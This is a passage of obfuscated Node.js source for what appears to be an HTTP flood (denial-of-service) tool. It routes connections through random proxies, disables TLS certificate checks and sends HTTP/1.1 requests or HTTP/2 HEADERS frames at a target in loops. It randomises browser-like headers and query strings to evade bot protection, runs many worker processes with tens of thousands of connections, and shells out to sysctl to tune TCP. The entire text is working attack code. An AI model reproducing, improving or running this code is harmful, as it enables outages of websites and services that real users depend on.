    let _0x472733 = reqmethod + '\x20' + url[_0x2a830d(0x268)] + '\x20HTTP/1.1\x0d\x0a' + ('Accept:\x20' + _0x20bfef + '\x0d\x0a') + 'Accept-Encoding:\x20gzip,\x20deflate,\x20br\x0d\x0a' + ('Accept-Language:\x20' + _0x2790d1 + '\x0d\x0a') + _0x2a830d(0x228) + 'Connection:\x20Keep-Alive\x0d\x0a' + (_0x2a830d(0x1da) + url['hostname'] + '\x0d\x0a') + _0x2a830d(0x253) + _0x2a830d(0x1d2) + _0x2a830d(0x1e2) + 'Sec-Fetch-User:\x20?1\x0d\x0a' + _0x2a830d(0x267) + (_0x2a830d(0x21c) + _0x56e852 + '\x0d\x0a') + ('sec-ch-ua:\x20' + _0xd413ed + '\x0d\x0a') + 'sec-ch-ua-mobile:\x20?0\x0d\x0a' + _0x2a830d(0x18c) + _0x2e00f7;
    hcookie && (_0x472733 += 'Cookie:\x20' + hcookie + '\x0d\x0a');
    _0x354767 && (_0x472733 += _0x2a830d(0x186) + _0x354767 + '\x0d\x0a' + _0xb8de13);
    const _0x150de7 = Buffer[_0x2a830d(0x209)]('' + _0x472733, _0x2a830d(0x238));
    return _0x150de7;
}
const http1Payload = Buffer[a0_0x568c87(0x1e5)](new Array(0x1)[a0_0x568c87(0x234)](buildRequest()));

function go() {
    const _0x28d75e = a0_0x568c87;
    var [_0x4d20fc, _0x3df00f] = _0x28d75e(0x1a0);
    customIP ? [_0x4d20fc, _0x3df00f] = customIP['split'](':') : [_0x4d20fc, _0x3df00f] = proxy[~~(Math['random']() * proxy['length'])][_0x28d75e(0x1fb)](':');
    let _0x5918a4;
    if (!_0x3df00f || isNaN(_0x3df00f)) {
        go();
        return;
    }
    const _0x3a961f = net['connect'](Number(_0x3df00f), _0x4d20fc, () => {
        const _0x4ea4fd = _0x28d75e;
        _0x3a961f[_0x4ea4fd(0x1ac)]('data', () => {
            const _0x28869d = _0x4ea4fd;
            _0x5918a4 = tls[_0x28869d(0x270)]({
                'socket': _0x3a961f,
                'ALPNProtocols': forceHttp === 0x1 ? ['http/1.1'] : forceHttp === 0x2 ? ['h2'] : forceHttp === undefined ? Math[_0x28869d(0x1d5)]() >= 0.5 ? ['h2'] : [_0x28869d(0x189)] : ['h2', _0x28869d(0x189)],
                'servername': url['host'],
                'ciphers': _0x28869d(0x1f6),
                'sigalgs': _0x28869d(0x1d4),
                'secureOptions': crypto['constants'][_0x28869d(0x247)] | crypto[_0x28869d(0x1d7)][_0x28869d(0x215)] | crypto['constants'][_0x28869d(0x223)] | crypto[_0x28869d(0x1d7)][_0x28869d(0x1dd)] | crypto[_0x28869d(0x1d7)]['SSL_OP_NO_COMPRESSION'] | crypto[_0x28869d(0x1d7)][_0x28869d(0x247)] | crypto[_0x28869d(0x1d7)]['SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION'] | crypto[_0x28869d(0x1d7)][_0x28869d(0x1b8)] | crypto['constants'][_0x28869d(0x199)] | crypto['constants'][_0x28869d(0x229)],
                'secure': !![],
                'minVersion': 'TLSv1.2',
                'maxVersion': 'TLSv1.3',
                'rejectUnauthorized': ![]
            }, () => {
                const _0x5a2306 = _0x28869d;
                if (!_0x5918a4[_0x5a2306(0x1c1)] || _0x5918a4[_0x5a2306(0x1c1)] == _0x5a2306(0x189)) {
                    if (forceHttp == 0x2) {
                        _0x5918a4[_0x5a2306(0x1a4)](() => _0x5918a4['destroy']());
                        return;
                    }

                    function _0x340229() {
                        _0x5918a4['write'](http1Payload, _0x365ce0 => {
                            const _0x26f707 = a0_0x3db5;
                            !_0x365ce0 ? setTimeout(() => {
                                _0x340229();
                            }, isFull ? 0x3e8 : 0x3e8 / ratelimit) : _0x5918a4[_0x26f707(0x1a4)](() => _0x5918a4['destroy']());
                        });
                    }
                    _0x340229(), _0x5918a4['on'](_0x5a2306(0x249), () => {
                        const _0x4d1724 = _0x5a2306;
                        _0x5918a4['end'](() => _0x5918a4[_0x4d1724(0x20a)]());
                    });
                    return;
                }
                if (forceHttp == 0x1) {
                    _0x5918a4[_0x5a2306(0x1a4)](() => _0x5918a4[_0x5a2306(0x20a)]());
                    return;
                }
                let _0x353d27 = 0x1,
                    _0x1e7870 = Buffer['alloc'](0x0),
                    _0x320996 = new HPACK();
                _0x320996[_0x5a2306(0x222)](0x1000);
                const _0x4a26a7 = Buffer['alloc'](0x4);
                _0x4a26a7['writeUInt32BE'](custom_update, 0x0);
                const _0x468ec4 = [Buffer[_0x5a2306(0x209)](PREFACE, 'binary'), encodeFrame(0x0, 0x4, encodeSettings([
                    [0x1, custom_header],
                    [0x2, 0x0],
                    [0x4, custom_window],
                    [0x6, custom_table]
                ])), encodeFrame(0x0, 0x8, _0x4a26a7)];
                _0x5918a4['on'](_0x5a2306(0x1a6), _0xa95dc7 => {
                    const _0x2e4143 = _0x5a2306;
                    _0x1e7870 = Buffer[_0x2e4143(0x1e5)]([_0x1e7870, _0xa95dc7]);
                    while (_0x1e7870[_0x2e4143(0x260)] >= 0x9) {
                        const _0x52d6e3 = decodeFrame(_0x1e7870);
                        if (_0x52d6e3 != null) {
                            _0x1e7870 = _0x1e7870['subarray'](_0x52d6e3['length'] + 0x9);
                            _0x52d6e3[_0x2e4143(0x206)] == 0x4 && _0x52d6e3[_0x2e4143(0x26a)] == 0x0 && _0x5918a4[_0x2e4143(0x1bd)](encodeFrame(0x0, 0x4, '', 0x1));
                            if (_0x52d6e3[_0x2e4143(0x206)] == 0x1 && debugMode) {
                                const _0x2aec7c = _0x320996[_0x2e4143(0x1d6)](_0x52d6e3['payload'])[_0x2e4143(0x1b4)](_0x111998 => _0x111998[0x0] == _0x2e4143(0x1e1))[0x1];
                                if (!statuses[_0x2aec7c]) statuses[_0x2aec7c] = 0x0;
                                statuses[_0x2aec7c]++;
                            }
                            if (_0x52d6e3[_0x2e4143(0x206)] == 0x7 || _0x52d6e3[_0x2e4143(0x206)] == 0x5) {
                                if (_0x52d6e3[_0x2e4143(0x206)] == 0x7) {
                                    if (debugMode) {
                                        if (!statuses[_0x2e4143(0x246)]) statuses[_0x2e4143(0x246)] = 0x0;
                                        statuses['GOAWAY']++;
                                    }
                                }
                                _0x5918a4[_0x2e4143(0x1bd)](encodeRstStream(0x0, 0x3, 0x0)), _0x5918a4[_0x2e4143(0x1a4)](() => _0x5918a4['destroy']());
                            }
                        } else break;
                    }
                }), _0x5918a4[_0x5a2306(0x1bd)](Buffer[_0x5a2306(0x1e5)](_0x468ec4));

                function _0x48afc9() {
                    const _0x4aeb7b = _0x5a2306;
                    if (_0x5918a4[_0x4aeb7b(0x1d1)]) return;
                    const _0x286dc8 = [],
                        _0x518f48 = [];
                    if (customHeaders) {
                        const _0x2f0f05 = customHeaders[_0x4aeb7b(0x1fb)]('#');
                        for (const _0x444b62 of _0x2f0f05) {
                            const [_0x14e93b, _0x21140c] = _0x444b62[_0x4aeb7b(0x1fb)](':');
                            _0x14e93b && _0x21140c && _0x518f48[_0x4aeb7b(0x19e)]({
                                [_0x14e93b[_0x4aeb7b(0x22e)]()['toLowerCase']()]: _0x21140c[_0x4aeb7b(0x22e)]()
                            });
                        }
                    }
                    let _0x3e42cc;
                    randrate !== undefined ? _0x3e42cc = getRandomInt(0x1, 0x3b) : _0x3e42cc = process[_0x4aeb7b(0x1ee)][0x6];
                    for (let _0x2478ef = 0x0; _0x2478ef < (isFull ? _0x3e42cc : 0x1); _0x2478ef++) {
                        const _0x2d7a4a = getRandomInt(0x78, 0x7b),
                            _0x37eed4 = [_0x4aeb7b(0x198), _0x4aeb7b(0x20b)],
                            _0xb65291 = _0x37eed4[Math[_0x4aeb7b(0x1ce)](Math[_0x4aeb7b(0x1d5)]() * _0x37eed4['length'])],
                            _0x41cd9b = [_0x4aeb7b(0x1f5), _0x4aeb7b(0x264), _0x4aeb7b(0x23a)],
                            _0x445e2d = _0x41cd9b[Math[_0x4aeb7b(0x1ce)](Math['random']() * _0x41cd9b[_0x4aeb7b(0x260)])];
                        let _0xdca9c2;
                        if (_0x2d7a4a === 0x78) _0xdca9c2 = '\x22Not_A\x20Brand\x22;v=\x228\x22,\x20\x22Chromium\x22;v=\x22' + _0x2d7a4a + '\x22,\x20\x22' + _0xb65291 + _0x4aeb7b(0x255) + _0x2d7a4a + '\x22';
                        else {
                            if (_0x2d7a4a === 0x79) _0xdca9c2 = _0x4aeb7b(0x23c) + _0xb65291 + _0x4aeb7b(0x255) + _0x2d7a4a + _0x4aeb7b(0x1a7) + _0x2d7a4a + '\x22';
                            else {
                                if (_0x2d7a4a === 0x7a) _0xdca9c2 = _0x4aeb7b(0x23f) + _0x2d7a4a + _0x4aeb7b(0x200) + _0xb65291 + _0x4aeb7b(0x255) + _0x2d7a4a + '\x22';
                                else _0x2d7a4a === 0x7b && (_0xdca9c2 = '\x22' + _0xb65291 + _0x4aeb7b(0x255) + _0x2d7a4a + _0x4aeb7b(0x1c7) + _0x2d7a4a + '\x22');
                            }
                        }
                        const _0x3af151 = _0xb65291 === _0x4aeb7b(0x20b),
                            _0x14170a = _0x3af151 ? _0x4aeb7b(0x1ef) : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                            _0x13e7ef = _0x3af151 ? _0x4aeb7b(0x240) : _0x4aeb7b(0x1dc),
                            _0x18b5f7 = _0x3af151 ? '1' : undefined,
                            _0xdb1e6f = _0x3af151 ? '\x22\x22' : undefined,
                            _0x381d47 = _0x3af151 ? 'Windows' : undefined,
                            _0x56cf7a = _0x3af151 ? _0x4aeb7b(0x250) : undefined,
                            _0x3c1b45 = _0x3af151 ? '?0' : undefined;
                        var _0xd34a89 = _0x4aeb7b(0x25f) + _0x2d7a4a + _0x4aeb7b(0x205);
                        customUA ? _0xd34a89 = customUA : _0xd34a89 = 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/' + _0x2d7a4a + _0x4aeb7b(0x205);
                        const _0x42244b = '' + _0xdca9c2,
                            _0xdbc290 = refererValue === 'rand' ? _0x4aeb7b(0x208) + ememmmmmemmeme(0x6, 0x6) + '.net' : refererValue,
                            _0x32adea = Object['entries']({
                                ':method': reqmethod,
                                ':authority': url['hostname'],
                                ':scheme': _0x4aeb7b(0x1af),
                                ':path': query ? _0x5a86f2(query) : url[_0x4aeb7b(0x268)] + (postdata ? '?' + postdata : '')
                            })[_0x4aeb7b(0x1e5)](Object[_0x4aeb7b(0x26e)]({
                                ...Math[_0x4aeb7b(0x1d5)]() < 0.4 && {
                                    'cache-control': _0x4aeb7b(0x196)
                                },
                                ...reqmethod === _0x4aeb7b(0x188) && {
                                    'content-length': '0'
                                },
                                'sec-ch-ua': _0x42244b,
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '\x22Windows\x22',
                                'upgrade-insecure-requests': '1',
                                'user-agent': _0xd34a89,
                                'accept': _0x14170a,
                                ..._0x18b5f7 && {
                                    'sec-gpc': _0x18b5f7
                                },
                                ..._0x3c1b45 && {
                                    'sec-ch-ua-mobile': _0x3c1b45
                                },
                                ..._0xdb1e6f && {
                                    'sec-ch-ua-model': _0xdb1e6f
                                },
                                ..._0x381d47 && {
                                    'sec-ch-ua-platform': _0x381d47
                                },
                                ..._0x56cf7a && {
                                    'sec-ch-ua-platform-version': _0x56cf7a
                                },
                                ...Math['random']() < 0.5 && {
                                    'sec-fetch-site': _0xdbc290 ? _0x445e2d : 'none'
                                },
                                ...Math['random']() < 0.5 && {
                                    'sec-fetch-mode': _0x4aeb7b(0x1e4)
                                },
                                ...Math[_0x4aeb7b(0x1d5)]() < 0.5 && {
                                    'sec-fetch-user': '?1'
                                },
                                ...Math[_0x4aeb7b(0x1d5)]() < 0.5 && {
                                    'sec-fetch-dest': 'document'
                                },
                                'accept-encoding': 'gzip,\x20deflate,\x20br',
                                'accept-language': _0x13e7ef,
                                ...hcookie && {
                                    'cookie': hcookie
                                },
                                ..._0xdbc290 && {
                                    'referer': _0xdbc290
                                },
                                ..._0x518f48[_0x4aeb7b(0x1c4)]((_0x5d5433, _0x52ef1f) => ({
                                    ..._0x5d5433,
                                    ..._0x52ef1f
                                }), {})
                            })['filter'](_0x46af83 => _0x46af83[0x1] != null)),
                            _0x46b4b0 = Object[_0x4aeb7b(0x26e)]({
                                ':method': reqmethod,
                                ':authority': url[_0x4aeb7b(0x24f)],
                                ':scheme': _0x4aeb7b(0x1af),
                                ':path': query ? _0x5a86f2(query) : url[_0x4aeb7b(0x268)] + (postdata ? '?' + postdata : '')
                            })[_0x4aeb7b(0x1e5)](Object[_0x4aeb7b(0x26e)]({
                                ...Math[_0x4aeb7b(0x1d5)]() < 0.4 && {
                                    'cache-control': _0x4aeb7b(0x196)
                                },
                                ...reqmethod === 'POST' && {
                                    'content-length': '0'
                                },
                                'sec-ch-ua': _0x42244b,
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '\x22Windows\x22',
                                'upgrade-insecure-requests': '1',
                                'user-agent': _0xd34a89,
                                'accept': _0x14170a,
                                ..._0x18b5f7 && {
                                    'sec-gpc': _0x18b5f7
                                },
                                ..._0x3c1b45 && {
                                    'sec-ch-ua-mobile': _0x3c1b45
                                },
                                ..._0xdb1e6f && {
                                    'sec-ch-ua-model': _0xdb1e6f
                                },
                                ..._0x381d47 && {
                                    'sec-ch-ua-platform': _0x381d47
                                },
                                ..._0x56cf7a && {
                                    'sec-ch-ua-platform-version': _0x56cf7a
                                },
                                'sec-fetch-site': _0xdbc290 ? _0x445e2d : _0x4aeb7b(0x1e8),
                                'sec-fetch-mode': 'navigate',
                                'sec-fetch-user': '?1',
                                'sec-fetch-dest': _0x4aeb7b(0x1f9),
                                'accept-encoding': 'gzip,\x20deflate,\x20br',
                                'accept-language': _0x13e7ef,
                                ...hcookie && {
                                    'cookie': hcookie
                                },
                                ..._0xdbc290 && {
                                    'referer': _0xdbc290
                                },
                                ..._0x518f48[_0x4aeb7b(0x1c4)]((_0x4fa43f, _0x1c5df2) => ({
                                    ..._0x4fa43f,
                                    ..._0x1c5df2
                                }), {})
                            })['filter'](_0x11d40d => _0x11d40d[0x1] != null)),
                            _0x332634 = Object[_0x4aeb7b(0x26e)]({
                                ...Math[_0x4aeb7b(0x1d5)]() < 0.3 && {
                                    [_0x4aeb7b(0x22b) + getRandomChar()]: _0x4aeb7b(0x1e8) + getRandomChar()
                                },
                                ...Math[_0x4aeb7b(0x1d5)]() < 0.3 && {
                                    ['sec-ms-gec-version' + getRandomChar()]: _0x4aeb7b(0x236) + getRandomChar()
                                },
                                ...Math[_0x4aeb7b(0x1d5)]() < 0.3 && {
                                    ['sec-fetch-users' + getRandomChar()]: '?0' + getRandomChar()
                                },
                                ...Math[_0x4aeb7b(0x1d5)]() < 0.3 && {
                                    [_0x4aeb7b(0x1bf) + getRandomChar()]: 'dynamic' + getRandomChar()
                                }
                            })[_0x4aeb7b(0x1e6)](_0x361052 => _0x361052[0x1] != null);
                        for (let _0xd08f44 = _0x332634[_0x4aeb7b(0x260)] - 0x1; _0xd08f44 > 0x0; _0xd08f44--) {
                            const _0x3a1fea = Math['floor'](Math[_0x4aeb7b(0x1d5)]() * (_0xd08f44 + 0x1));
                            [_0x332634[_0xd08f44], _0x332634[_0x3a1fea]] = [_0x332634[_0x3a1fea], _0x332634[_0xd08f44]];
                        }
                        const _0x2ebf1b = useLegitHeaders ? _0x46b4b0['concat']() : _0x32adea[_0x4aeb7b(0x1e5)](_0x332634);

                        function _0x5a86f2(_0x4d2155) {
                            const _0x9c5409 = _0x4aeb7b;
                            if (_0x4d2155 === '1') return url[_0x9c5409(0x268)] + _0x9c5409(0x261) + randstrr(0x1e) + '_' + randstrr(0xc) + '-' + timestampString + _0x9c5409(0x18d) + _0x9c5409(0x204) + randstrr(0x8);
                            else {
                                if (_0x4d2155 === '2') return url[_0x9c5409(0x268)] + '?' + generateRandomString(0x6, 0x7) + '&' + generateRandomString(0x6, 0x7);
                                else return _0x4d2155 === '3' ? url['pathname'] + '?q=' + generateRandomString(0x6, 0x7) + '&' + generateRandomString(0x6, 0x7) : url[_0x9c5409(0x268)];
                            }
                        }
                        const _0x26397e = Buffer[_0x4aeb7b(0x1e5)]([Buffer['from']([0x80, 0x0, 0x0, 0x0, 0xff]), _0x320996[_0x4aeb7b(0x21a)](_0x2ebf1b)]);
                        _0x286dc8[_0x4aeb7b(0x19e)](encodeFrame(_0x353d27, 0x1, _0x26397e, 0x25)), _0x353d27 += 0x2;
                    }
                    _0x5918a4[_0x4aeb7b(0x1bd)](Buffer['concat'](_0x286dc8), _0x172454 => {
                        !_0x172454 && setTimeout(() => {
                            _0x48afc9();
                        }, isFull ? 0x3e8 : 0x3e8 / _0x3e42cc);
                    });
                }
                _0x48afc9();
            })['on'](_0x28869d(0x249), () => {
                const _0x2b22a9 = _0x28869d;
                _0x5918a4[_0x2b22a9(0x20a)]();
            });
        }), _0x3a961f['write'](_0x4ea4fd(0x20f) + url[_0x4ea4fd(0x18b)] + _0x4ea4fd(0x1b6) + url[_0x4ea4fd(0x18b)] + _0x4ea4fd(0x1a5));
    })[_0x28d75e(0x1ac)](_0x28d75e(0x249), () => {})['once'](_0x28d75e(0x1ab), () => {
        _0x5918a4 && _0x5918a4['end'](() => {
            const _0x2cab5a = a0_0x3db5;
            _0x5918a4[_0x2cab5a(0x20a)](), go();
        });
    });
}

function TCP_CHANGES_SERVER() {
    const _0x47f7a8 = a0_0x568c87,
        _0x3d1a0e = [_0x47f7a8(0x24b), 'reno', 'bbr', 'dctcp', 'hybla'],
        _0x388dec = ['1', '0'],
        _0x3103be = ['1', '0'],
        _0x4df182 = ['1', '0'],
        _0x6245a9 = ['1', '0'],
        _0xc905f1 = ['3', '2', '1', '0'],
        _0x4e2840 = _0x3d1a0e[Math[_0x47f7a8(0x1ce)](Math['random']() * _0x3d1a0e['length'])],
        _0x404b7c = _0x388dec[Math[_0x47f7a8(0x1ce)](Math[_0x47f7a8(0x1d5)]() * _0x388dec[_0x47f7a8(0x260)])],
        _0x3f6bbf = _0x3103be[Math[_0x47f7a8(0x1ce)](Math[_0x47f7a8(0x1d5)]() * _0x3103be[_0x47f7a8(0x260)])],
        _0x29c251 = _0x4df182[Math[_0x47f7a8(0x1ce)](Math[_0x47f7a8(0x1d5)]() * _0x4df182[_0x47f7a8(0x260)])],
        _0x354646 = _0x6245a9[Math[_0x47f7a8(0x1ce)](Math[_0x47f7a8(0x1d5)]() * _0x6245a9['length'])],
        _0x46f188 = _0xc905f1[Math[_0x47f7a8(0x1ce)](Math[_0x47f7a8(0x1d5)]() * _0xc905f1[_0x47f7a8(0x260)])],
        _0xcb476b = _0x47f7a8(0x243) + _0x4e2840 + '\x20net.ipv4.tcp_sack=' + _0x404b7c + '\x20net.ipv4.tcp_window_scaling=' + _0x3f6bbf + _0x47f7a8(0x1bc) + _0x29c251 + _0x47f7a8(0x252) + _0x354646 + _0x47f7a8(0x1c0) + _0x46f188;
    exec(_0xcb476b, () => {});
}
setInterval(() => {
    timer++;
}, 0x3e8), setInterval(() => {
    timer <= 0xa ? (custom_header = custom_header + 0x1, custom_window = custom_window + 0x1, custom_table = custom_table + 0x1, custom_update = custom_update + 0x1) : (custom_table = 0x10000, custom_window = 0x600000, custom_header = 0x40000, custom_update = 0xef0001, timer = 0x0);
}, 0x2710);
if (cluster[a0_0x568c87(0x18a)]) {
    const workers = {};
    Array[a0_0x568c87(0x209)]({
        'length': threads
    }, (_0x520789, _0x3c897d) => cluster[a0_0x568c87(0x18f)]({
        'core': _0x3c897d % os[a0_0x568c87(0x258)]()[a0_0x568c87(0x260)]
    })), console[a0_0x568c87(0x1fe)](), console[a0_0x568c87(0x249)](a0_0x568c87(0x1f4)), cluster[a0_0x568c87(0x18a)] && setInterval(() => {
        const _0x472f38 = a0_0x568c87;
        console[_0x472f38(0x1ed)](_0x472f38(0x1ff) + target + '\x20|\x20TIME:\x20' + time + 's');
    }, 0x3e8), cluster['on'](a0_0x568c87(0x237), _0x1bfd2b => {
        const _0x74e2a3 = a0_0x568c87;
        cluster[_0x74e2a3(0x18f)]({
            'core': _0x1bfd2b['id'] % os[_0x74e2a3(0x258)]()[_0x74e2a3(0x260)]
        });
    }), cluster['on']('message', (_0x535612, _0x4da2bb) => {
        workers[_0x535612['id']] = [_0x535612, _0x4da2bb];
    }), debugMode && setInterval(() => {
        const _0x508356 = a0_0x568c87;
        let _0x3726d = {};
        for (let _0x25b6fe in workers) {
            if (workers[_0x25b6fe][0x0][_0x508356(0x21b)] == _0x508356(0x1b2))
                for (let _0x30bc81 of workers[_0x25b6fe][0x1]) {
                    for (let _0x5762fe in _0x30bc81) {
                        if (_0x3726d[_0x5762fe] == null) _0x3726d[_0x5762fe] = 0x0;
                        _0x3726d[_0x5762fe] += _0x30bc81[_0x5762fe];
                    }
                }
        }
        console[_0x508356(0x1fe)](), console['log'](new Date()[_0x508356(0x1b1)]('us'), _0x3726d);
    }, 0x3e8), setInterval(TCP_CHANGES_SERVER, 0x1388), setTimeout(() => process['exit'](0x1), time * 0x3e8);
} else {
    let conns = 0x0,
        i = setInterval(() => {
            if (conns < 0x7530) conns++;
            else {
                clearInterval(i);
                return;
            }
            go();
        }, delay);
    debugMode && setInterval(() => {
        const _0x5e65bb = a0_0x568c87;
        if (statusesQ[_0x5e65bb(0x260)] >= 0x4) statusesQ[_0x5e65bb(0x1df)]();
        statusesQ[_0x5e65bb(0x19e)](statuses), statuses = {}, process['send'](statusesQ);
    }, 0xfa), setTimeout(() => process[a0_0x568c87(0x237)](0x1), time * 0x3e8);
}